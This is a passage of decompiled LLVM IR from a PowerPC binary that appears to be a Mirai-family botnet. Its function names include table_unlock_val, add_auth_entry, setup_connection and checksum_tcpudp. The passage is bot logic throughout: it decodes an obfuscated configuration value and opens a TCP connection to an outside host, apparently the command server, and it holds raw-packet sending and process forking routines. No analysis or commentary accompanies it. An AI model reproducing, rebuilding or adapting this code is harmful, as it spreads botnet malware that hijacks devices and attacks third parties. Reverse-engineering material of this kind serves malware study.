  %v3_1000894c = load i32, i32* @global_var_10021200.153, align 4
  store i32 %v3_1000894c, i32* %r11.global-to-local, align 4
  %v1_10008954 = icmp slt i32 %v3_1000894c, 0
  %v3_10008954 = icmp eq i32 %v3_1000894c, 0
  store i1 %v1_10008954, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008954, i1* %cr7_eq.global-to-local, align 1
  %v2_10008950 = urem i32 %v0_1000893c, %v4_10008944
  %v2_10008958 = sub i32 %v0_1000893c, %v2_10008950
  store i32 %v2_10008958, i32* %r0.global-to-local, align 4
  %tmp176 = icmp slt i32 %v3_1000894c, 1
  br i1 %tmp176, label %dec_label_pc_100089a0, label %dec_label_pc_10008968

dec_label_pc_10008968:                            ; preds = %dec_label_pc_10008934
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %v3_1000894c, i32* %ctr.global-to-local, align 4
  %v3_10008970 = load i32, i32* @global_var_10021204.154, align 4
  store i32 %v3_10008970, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008980

dec_label_pc_10008978:                            ; preds = %dec_label_pc_10008990, %dec_label_pc_10008980
  %v4_1000899456 = phi i1 [ %v4_10008994, %dec_label_pc_10008990 ], [ %v4_10008988, %dec_label_pc_10008980 ]
  %v2_1000899454 = phi i1 [ %v2_10008994, %dec_label_pc_10008990 ], [ %v2_10008988, %dec_label_pc_10008980 ]
  %v1_10008978 = add i32 %v0_10008978, 16
  store i32 %v1_10008978, i32* %r0.global-to-local, align 4
  %v1_1000897c = add i32 %v0_1000897c, -1
  store i32 %v1_1000897c, i32* %ctr.global-to-local, align 4
  %v2_1000897c = icmp eq i32 %v1_1000897c, 0
  br i1 %v2_1000897c, label %dec_label_pc_100089a0.loopexit, label %dec_label_pc_10008980

dec_label_pc_10008980:                            ; preds = %dec_label_pc_10008978, %dec_label_pc_10008968
  %v0_1000897c = phi i32 [ %v1_1000897c, %dec_label_pc_10008978 ], [ %v3_1000894c, %dec_label_pc_10008968 ]
  %v0_10008978 = phi i32 [ %v1_10008978, %dec_label_pc_10008978 ], [ %v3_10008970, %dec_label_pc_10008968 ]
  store i32 %v0_10008978, i32* %r11.global-to-local, align 4
  %v1_10008984 = add i32 %v0_10008978, 8
  %v2_10008984 = inttoptr i32 %v1_10008984 to i16*
  %v3_10008984 = load i16, i16* %v2_10008984, align 2
  %v4_10008984 = zext i16 %v3_10008984 to i32
  store i32 %v4_10008984, i32* %r0.global-to-local, align 4
  %v2_10008988 = icmp ult i32 %v4_10008984, %v2_10008950
  %v3_10008988 = icmp ugt i32 %v4_10008984, %v2_10008950
  %v4_10008988 = icmp eq i32 %v4_10008984, %v2_10008950
  br i1 %v3_10008988, label %dec_label_pc_10008978, label %dec_label_pc_10008990

dec_label_pc_10008990:                            ; preds = %dec_label_pc_10008980
  %v1_10008990 = add i32 %v0_10008978, 10
  %v2_10008990 = inttoptr i32 %v1_10008990 to i16*
  %v3_10008990 = load i16, i16* %v2_10008990, align 2
  %v4_10008990 = zext i16 %v3_10008990 to i32
  store i32 %v4_10008990, i32* %r0.global-to-local, align 4
  %v2_10008994 = icmp ult i32 %v4_10008990, %v2_10008950
  %v3_10008994 = icmp ugt i32 %v4_10008990, %v2_10008950
  %v4_10008994 = icmp eq i32 %v4_10008990, %v2_10008950
  br i1 %v3_10008994, label %dec_label_pc_100089a4.loopexit, label %dec_label_pc_10008978

dec_label_pc_100089a0.loopexit:                   ; preds = %dec_label_pc_10008978
  store i1 %v2_1000899454, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000899456, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_100089a0

dec_label_pc_100089a0:                            ; preds = %dec_label_pc_100089a0.loopexit, %dec_label_pc_10008934
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100089a4

dec_label_pc_100089a4.loopexit:                   ; preds = %dec_label_pc_10008990
  store i1 %v2_10008994, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10008994, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_100089a4

dec_label_pc_100089a4:                            ; preds = %dec_label_pc_100089a4.loopexit, %dec_label_pc_100089a0
  %v0_100089a8 = phi i32 [ %v0_10008978, %dec_label_pc_100089a4.loopexit ], [ 0, %dec_label_pc_100089a0 ]
  %v0_100089a4 = load i32, i32* @r28, align 4
  %v1_100089a4 = add i32 %v0_100089a4, 4
  %v2_100089a4 = inttoptr i32 %v1_100089a4 to i32*
  %v3_100089a4 = load i32, i32* %v2_100089a4, align 4
  store i32 %v3_100089a4, i32* %r0.global-to-local, align 4
  %v2_100089a8 = inttoptr i32 %v0_100089a4 to i32*
  store i32 %v0_100089a8, i32* %v2_100089a8, align 4
  %v1_100089ac = urem i32 %v3_100089a4, 32
  store i32 %v1_100089ac, i32* %r10.global-to-local, align 4
  %v1_100089b0 = call i32 @__asm_rlwinm(i32 %v3_100089a4, i32 29, i32 3, i32 29)
  store i32 %v1_100089b0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100089b8 = load i32, i32* @r28, align 4
  %v2_100089b8 = add i32 %v1_100089b8, 24
  %v3_100089b8 = inttoptr i32 %v2_100089b8 to i32*
  store i32 0, i32* %v3_100089b8, align 4
  %v0_10007e00.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10007e00.pre = load i32, i32* @r22, align 4
  %v1_10007e08.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007e00

dec_label_pc_100089c0:                            ; preds = %dec_label_pc_10008904
  %v0_100089c0 = load i32, i32* @r28, align 4
  %v1_100089c0 = add i32 %v0_100089c0, 4
  %v2_100089c0 = inttoptr i32 %v1_100089c0 to i32*
  %v3_100089c0 = load i32, i32* %v2_100089c0, align 4
  store i32 %v3_100089c0, i32* @r3, align 4
  %v0_100089c4 = call i32 @__GI___libc_close()
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_100089d0 = load i32, i32* @r28, align 4
  %v2_100089d0 = add i32 %v1_100089d0, 12
  %v3_100089d0 = inttoptr i32 %v2_100089d0 to i32*
  store i32 0, i32* %v3_100089d0, align 4
  %v0_100089d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100089d4 = load i32, i32* @r28, align 4
  %v2_100089d4 = add i32 %v1_100089d4, 4
  %v3_100089d4 = inttoptr i32 %v2_100089d4 to i32*
  store i32 %v0_100089d4, i32* %v3_100089d4, align 4
  %v0_100089d8 = load i32, i32* %r29.global-to-local, align 4
  %v1_100089d8 = trunc i32 %v0_100089d8 to i8
  %v2_100089d8 = load i32, i32* @r28, align 4
  %v3_100089d8 = add i32 %v2_100089d8, 284
  %v4_100089d8 = inttoptr i32 %v3_100089d8 to i8*
  store i8 %v1_100089d8, i8* %v4_100089d8, align 1
  br label %dec_label_pc_10008804

dec_label_pc_100089e0:                            ; preds = %dec_label_pc_10008874
  %v1_100089e0 = icmp slt i32 %v0_10008888, -1
  %v3_100089e0 = icmp eq i32 %v0_10008888, -1
  store i1 %v1_100089e0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100089e0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100089e0, label %dec_label_pc_10008894, label %dec_label_pc_100089e8

dec_label_pc_100089e8:                            ; preds = %dec_label_pc_100089e0
  store i32 268470776, i32* @lr, align 4
  %v3_100089f4 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_100089f8 = icmp slt i32 %v3_100089f4, -1
  %v3_100089f8 = icmp eq i32 %v3_100089f4, -1
  store i1 %v1_100089f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100089f8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_100089f4, i32* %r29.global-to-local, align 4
  br i1 %v3_100089f8, label %dec_label_pc_10007bd4, label %dec_label_pc_10008a04

dec_label_pc_10008a04:                            ; preds = %dec_label_pc_100089e8
  store i32 ptrtoint (i32* @global_var_10008a0c.229 to i32), i32* @lr, align 4
  %v1_10008a08 = call i32 @table_unlock_val(i32 4)
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 -1182179548, i32* %r0.global-to-local, align 4
  store i32 -1182179548, i32* @global_var_10023828.116, align 4
  %v3_10008a24 = call i32 @table_retrieve_val(i32 4, i32* null)
  %v4_10008a24 = inttoptr i32 %v3_10008a24 to i16*
  %v3_10008a28 = load i16, i16* %v4_10008a24, align 2
  %v4_10008a28 = zext i16 %v3_10008a28 to i32
  store i32 %v4_10008a28, i32* %r0.global-to-local, align 4
  store i32 268470840, i32* @lr, align 4
  %v1_10008a34 = call i32 @table_lock_val(i32 4)
  %v0_10008a38 = load i32, i32* %r29.global-to-local, align 4
  store i32 268470856, i32* @lr, align 4
  %v3_10008a44 = call i32 @__libc_connect(i32 %v0_10008a38, i32 %v2_10008a3c, i32 16)
  %v1_10008a48 = icmp slt i32 %v3_10008a44, -1
  %v3_10008a48 = icmp eq i32 %v3_10008a44, -1
  store i1 %v1_10008a48, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008a48, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008a48, label %dec_label_pc_10008a50, label %dec_label_pc_10007b38

dec_label_pc_10008a50:                            ; preds = %dec_label_pc_10008a04
  %v0_10008a50 = load i32, i32* @r29, align 4
  store i32 %v0_10008a50, i32* @r3, align 4
  %v0_10008a54 = call i32 @__GI___libc_close()
  %v0_10008a5c = call i32 @__GI_exit()
  store i32 268470888, i32* @lr, align 4
  %v1_10008a64 = call i32 @table_lock_val(i32 31)
  br label %dec_label_pc_10007e28.backedge

dec_label_pc_10008a70:                            ; preds = %dec_label_pc_100087b4
  store i32 104, i32* %r0.global-to-local, align 4
  %v1_10008a74 = load i32, i32* @r25, align 4
  %v2_10008a74 = inttoptr i32 %v1_10008a74 to i32*
  store i32 104, i32* %v2_10008a74, align 4
  br label %dec_label_pc_100087cc

dec_label_pc_10008a7c:                            ; preds = %dec_label_pc_100087cc
  %v0_10008a7c = load i32, i32* @r28, align 4
  store i32 %v0_10008a7c, i32* @r3, align 4
  store i32 268470916, i32* @lr, align 4
  %v0_10008a80 = call i32 @setup_connection()
  br label %dec_label_pc_10008804

dec_label_pc_10008ad0:                            ; preds = %dec_label_pc_10007c84
  %v1_10008ad4 = call i32 @__asm_rlwinm(i32 %v3_10008ad0, i32 29, i32 3, i32 29)
  %v1_10008ad8 = load i32, i32* @r28, align 4
  %v2_10008ad8 = icmp slt i32 %v3_10008ad0, %v1_10008ad8
  %v3_10008ad8 = icmp sgt i32 %v3_10008ad0, %v1_10008ad8
  %v4_10008ad8 = icmp eq i32 %v3_10008ad0, %v1_10008ad8
  store i1 %v2_10008ad8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10008ad8, i1* %cr7_eq.global-to-local, align 1
  %v1_10008adc = load i32, i32* @r22, align 4
  %v2_10008adc = add i32 %v1_10008adc, %v1_10008ad4
  store i32 %v2_10008adc, i32* %r11.global-to-local, align 4
  %v1_10008ae0 = urem i32 %v3_10008ad0, 32
  store i32 %v1_10008ae0, i32* %r0.global-to-local, align 4
  %v1_10008ae4 = add i32 %v2_10008adc, 184
  %v2_10008ae4 = inttoptr i32 %v1_10008ae4 to i32*
  %v3_10008ae4 = load i32, i32* %v2_10008ae4, align 4
  %v0_10008ae8 = load i32, i32* %r10.global-to-local, align 4
  %v3_10008ae8 = shl i32 %v0_10008ae8, %v1_10008ae0
  store i32 %v3_10008ae8, i32* %r0.global-to-local, align 4
  %v2_10008aec = or i32 %v3_10008ae8, %v3_10008ae4
  store i32 %v2_10008aec, i32* %r9.global-to-local, align 4
  store i32 %v2_10008aec, i32* %v2_10008ae4, align 4
  br i1 %v3_10008ad8, label %dec_label_pc_10008af8, label %dec_label_pc_10007cbc

dec_label_pc_10008af8:                            ; preds = %dec_label_pc_10008ad0
  store i32 %v3_10008ad0, i32* @r28, align 4
  br label %dec_label_pc_10007cbc

dec_label_pc_10008b00:                            ; preds = %dec_label_pc_10007d38, %dec_label_pc_10007d1c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10008b08 = load i32, i32* @r29, align 4
  %v2_10008b08 = add i32 %v1_10008b08, 12
  %v3_10008b08 = inttoptr i32 %v2_10008b08 to i32*
  store i32 0, i32* %v3_10008b08, align 4
  %v0_10008b0c = load i32, i32* %r9.global-to-local, align 4
  %v1_10008b0c = trunc i32 %v0_10008b0c to i8
  %v2_10008b0c = load i32, i32* @r29, align 4
  %v3_10008b0c = add i32 %v2_10008b0c, 284
  %v4_10008b0c = inttoptr i32 %v3_10008b0c to i8*
  store i8 %v1_10008b0c, i8* %v4_10008b0c, align 1
  br label %dec_label_pc_10007cbc

; uselistorder directives
  uselistorder i32 %v1_10008ae0, { 1, 0 }
  uselistorder i32 %v3_10008a44, { 1, 0 }
  uselistorder i32 %v3_100089f4, { 0, 2, 1 }
  uselistorder i32 %v3_100089a4, { 1, 0, 2 }
  uselistorder i32 %v4_10008990, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10008984, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10008978, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v1_1000897c, { 0, 2, 1 }
  uselistorder i32 %v2_10008950, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32 %v3_1000894c, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v0_10008888, { 1, 0, 2 }
  uselistorder i32 %v4_1000884c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_10008808, { 2, 0, 4, 3, 5, 1 }
  uselistorder i32 %v1_100087e4, { 1, 2, 0 }
  uselistorder i32 %v0_100087e4, { 1, 0 }
  uselistorder i32 %v2_100087c0, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %storemerge.in.in.in, { 1, 0 }
  uselistorder i32 %v3_10007ea4, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32 %v0_100081d4, { 0, 3, 2, 1 }
  uselistorder i32 %v3_100081d0, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v1_10007f20, { 1, 2, 0 }
  uselistorder i32 %v0_10007f20, { 1, 0 }
  uselistorder i32 %v4_10007ef4, { 1, 0 }
  uselistorder i32 %v1_10007eb4, { 1, 0 }
  uselistorder i32 %v3_10007ea447, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v1_10007e8c, { 2, 1, 0 }
  uselistorder i32 %v1_10007e88, { 1, 0 }
  uselistorder i32 %v1_10007e84, { 1, 0 }
  uselistorder i32 %v4_10007e60, { 4, 3, 6, 0, 1, 2, 5 }
  uselistorder i32 %v3_10007e4c, { 1, 0 }
  uselistorder i32 %v3_10007e30, { 1, 0, 2 }
  uselistorder i32 %v1_10007e0c, { 1, 0 }
  uselistorder i32 %v4_10007e08, { 1, 0 }
  uselistorder i32 %v3_10007e04, { 2, 1, 0 }
  uselistorder i32 %v1_10007e08, { 2, 1, 0 }
  uselistorder i32 %v1_10007df8, { 1, 0 }
  uselistorder i32 %v4_10007df4, { 1, 0 }
  uselistorder i32 %v3_10007df0, { 2, 1, 0 }
  uselistorder i32 %v1_10007dec, { 1, 0 }
  uselistorder i32 %v1_10007de8, { 2, 1, 0 }
  uselistorder i32 %v1_10007de4, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10007dd8, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v0_10007dc4, { 1, 0 }
  uselistorder i32 %v2_10008918, { 1, 2, 0 }
  uselistorder i32 %v1_10007d40, { 1, 2, 0 }
  uselistorder i32 %v1_10007d3c, { 1, 0 }
  uselistorder i32 %v3_10007d24, { 0, 2, 1, 3 }
  uselistorder i32 %v2_10007d10, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10007d0c, { 0, 2, 1 }
  uselistorder i32 %v1_10007d00, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10007cf8, { 1, 0 }
  uselistorder i32 %v3_10007ce8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_10007cd4, { 1, 0 }
  uselistorder i32 %v1_10007cc0, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_10007ca0, { 1, 0 }
  uselistorder i32 %v3_10008ad0, { 3, 0, 10, 9, 8, 11, 2, 1, 5, 6, 7, 4 }
  uselistorder i32 %v1_10007c70, { 1, 0 }
  uselistorder i32 %v1_10007c6c, { 1, 0 }
  uselistorder i32 %v1_10007c50, { 1, 0 }
  uselistorder i32 %v1_10007c4c, { 1, 0 }
  uselistorder i32 %v0_10007c1c, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 %v0_10007c08, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v0_10007bfc, { 1, 2, 0 }
  uselistorder i32 %v0_10007be8, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %stack_var_-96.7.off0, { 1, 0 }
  uselistorder i32 %v1_10007b28, { 0, 2, 1 }
  uselistorder i32 %v1_10007b10, { 1, 0 }
  uselistorder i32 %v3_10007b08, { 1, 0, 2 }
  uselistorder i32 %v1_10007b04, { 2, 1, 0 }
  uselistorder i32 %v1_10007b00, { 0, 2, 1 }
  uselistorder i32 %v0_10007b08, { 0, 3, 2, 1 }
  uselistorder i32 %v3_10007ad4, { 1, 0, 2 }
  uselistorder i32 %v2_10007acc, { 1, 0, 2 }
  uselistorder i32 %v0_10007ab4, { 1, 3, 2, 4, 0, 5, 6, 7 }
  uselistorder i32 %v3_10007a3c, { 1, 0, 2 }
  uselistorder i32 %v2_10007a28, { 1, 0, 2 }
  uselistorder i32 %v0_10007a28, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_10007a1c, { 2, 1, 0, 3 }
  uselistorder i1 %v3_10007a68, { 1, 0 }
  uselistorder i32 %v1_10007a98, { 1, 0 }
  uselistorder i32 %v1_10007a90, { 1, 0 }
  uselistorder i32 %v1_10007a88, { 1, 0 }
  uselistorder i32 %v1_10007aa8, { 2, 1, 0 }
  uselistorder i32 %v1_10007a80, { 1, 0 }
  uselistorder i32 %v4_10007a70, { 1, 0, 2 }
  uselistorder i32 %stack_var_-96.5.off0, { 0, 2, 1 }
  uselistorder i32 %v1_100079dc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_10007964, { 1, 0 }
  uselistorder i32 %v0_10007958, { 1, 0, 2 }
  uselistorder i32 %v3_10007948, { 1, 0, 2 }
  uselistorder i32 %v0_1000792c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-96.4.off0, { 0, 2, 1 }
  uselistorder i32 %v1_100078b4, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-96.3.off0, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10007910, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9, 12, 11, 14, 13, 16, 15, 18, 17, 20, 19, 22, 21, 23 }
  uselistorder i32 %v1_10007864, { 3, 1, 2, 0 }
  uselistorder i32 %v0_10007850, { 0, 3, 2, 1, 5, 4, 7, 6, 9, 8, 11, 10, 13, 12, 15, 14, 17, 16, 18, 20, 19, 21, 22 }
  uselistorder i32 %v1_10007838, { 1, 2, 0 }
  uselistorder i32 %v0_10007834, { 3, 2, 0, 1 }
  uselistorder i32 %v3_100077fc, { 1, 0, 2 }
  uselistorder i32 %v1_10007470, { 3, 1, 2, 0 }
  uselistorder i32 %v5_10007460, { 1, 0 }
  uselistorder i32 %v3_1000740c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_100073f4, { 1, 0 }
  uselistorder i32 %v0_100072fc, { 4, 3, 2, 1, 0, 5, 7, 6 }
  uselistorder i32* %stack_var_-1936, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-1888, { 1, 0, 2 }
  uselistorder i32* %stack_var_-1760, { 1, 0, 2 }
  uselistorder i32* %stack_var_-1924, { 1, 0 }
  uselistorder i32* %stack_var_-1932, { 2, 3, 4, 0, 5, 1, 7, 6 }
  uselistorder i32* %stack_var_-1904, { 2, 0, 3, 1 }
  uselistorder i32 %tmp112, { 1, 2, 0 }
  uselistorder i8 %tmp111, { 2, 1, 0 }
  uselistorder i16 %tmp110, { 0, 1, 4, 3, 2 }
  uselistorder i32 %tmp108, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 0, 9, 8, 10, 11, 1, 12, 13, 14, 15, 2, 3, 4, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 31, 30, 28, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63 }
  uselistorder i32* %r8.global-to-local, { 3, 4, 5, 6, 0, 7, 1, 2, 8, 9, 10 }
  uselistorder i32* %r27.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 9, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %r10.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 10, 11, 7, 9, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %r0.global-to-local, { 7, 8, 9, 12, 0, 1, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 2, 3, 4, 22, 23, 24, 25, 26, 5, 6, 27, 28, 30, 29, 32, 31, 33, 34, 35, 36, 37, 38, 42, 43, 45, 46, 44, 39, 40, 41, 47, 48, 49, 50, 51, 52, 85, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 86, 65, 66, 67, 68, 69, 70, 72, 71, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84 }
  uselistorder i1* %cr7_lt.global-to-local, { 9, 0, 1, 2, 82, 83, 10, 3, 4, 5, 11, 12, 13, 14, 15, 19, 81, 16, 6, 7, 8, 85, 17, 18, 86, 20, 21, 22, 23, 26, 28, 27, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 84, 79, 80 }
  uselistorder i1* %cr7_eq.global-to-local, { 10, 0, 1, 2, 86, 87, 11, 3, 4, 5, 12, 13, 14, 15, 16, 20, 85, 17, 6, 7, 8, 9, 89, 18, 19, 90, 21, 22, 23, 24, 25, 28, 30, 31, 29, 26, 27, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 88, 83, 84 }
  uselistorder i16* @global_var_100211fc.155, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @table_lock_val, { 28, 27, 26, 25, 24, 9, 8, 7, 6, 23, 5, 4, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 0, 1, 2, 18, 30, 31, 32, 3, 33, 34, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 40, 41, 42, 43, 44, 45, 46, 47, 35, 36, 37, 38, 39 }
  uselistorder i32 (i32)* @table_unlock_val, { 33, 32, 31, 18, 17, 16, 15, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 10, 9, 8, 7, 6, 5, 4, 3, 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 1, 0 }
  uselistorder i32 284, { 3, 4, 5, 6, 7, 0, 1, 2, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @setup_connection, { 2, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 172, { 1, 0, 2, 3 }
  uselistorder i32 ()* @add_auth_entry, { 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16* @global_var_100212ba.170, { 2, 0, 1 }
  uselistorder i16 23, { 2, 3, 1, 0, 4 }
  uselistorder i8 6, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32 ()* @rand_next, { 66, 65, 64, 63, 62, 61, 60, 3, 2, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 1, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 2048, { 3, 2, 0, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* @global_var_10021208.157, { 1, 2, 3, 0, 4 }
  uselistorder i32 288, { 2, 3, 6, 0, 4, 1, 5 }
  uselistorder i32 ()* @__GI_time, { 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 1, 4, 0, 3, 2 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32 (i32)* @util_local_addr, { 2, 1, 3, 0 }
  uselistorder i32 ()* @__libc_fork, { 5, 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_10008804, { 5, 6, 7, 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_100087cc, { 1, 0 }
  uselistorder label %dec_label_pc_10007e28.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100081e4, { 1, 0 }
  uselistorder label %dec_label_pc_100081d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100081c8, { 1, 0 }
  uselistorder label %dec_label_pc_10007eb0, { 1, 0 }
  uselistorder label %dec_label_pc_10007e90, { 1, 0 }
  uselistorder label %dec_label_pc_10007e88, { 1, 0 }
  uselistorder label %dec_label_pc_10007e40, { 1, 0 }
  uselistorder label %dec_label_pc_10007e30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007e00, { 1, 0 }
  uselistorder label %dec_label_pc_10007d94, { 1, 0 }
  uselistorder label %dec_label_pc_10007cbc, { 3, 4, 0, 5, 2, 6, 1 }
  uselistorder label %dec_label_pc_10007c30, { 0, 4, 1, 2, 3 }
  uselistorder label %dec_label_pc_10007bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10007bd4, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10007b20, { 1, 0 }
  uselistorder label %dec_label_pc_100079fc, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_100079f0, { 1, 0 }
  uselistorder label %dec_label_pc_100078b0, { 2, 0, 3, 1, 4, 6, 5 }
  uselistorder label %dec_label_pc_10007834, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_10007834.preheader, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000746c, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_10008b14 = icmp eq i32* %arg2, null
  %v1_10008b1c = mul i32 %arg1, 8
  store i32 %v1_10008b1c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10023834.233 to i32), i32* %r9.global-to-local, align 4
  br i1 %v3_10008b14, label %dec_label_pc_10008b34, label %dec_label_pc_10008b2c

dec_label_pc_10008b2c:                            ; preds = %entry
  %v1_10008b2c = add i32 %v1_10008b1c, add (i32 ptrtoint (i32* @global_var_10023834.233 to i32), i32 4)
  %v2_10008b2c = inttoptr i32 %v1_10008b2c to i16*
  %v3_10008b2c = load i16, i16* %v2_10008b2c, align 4
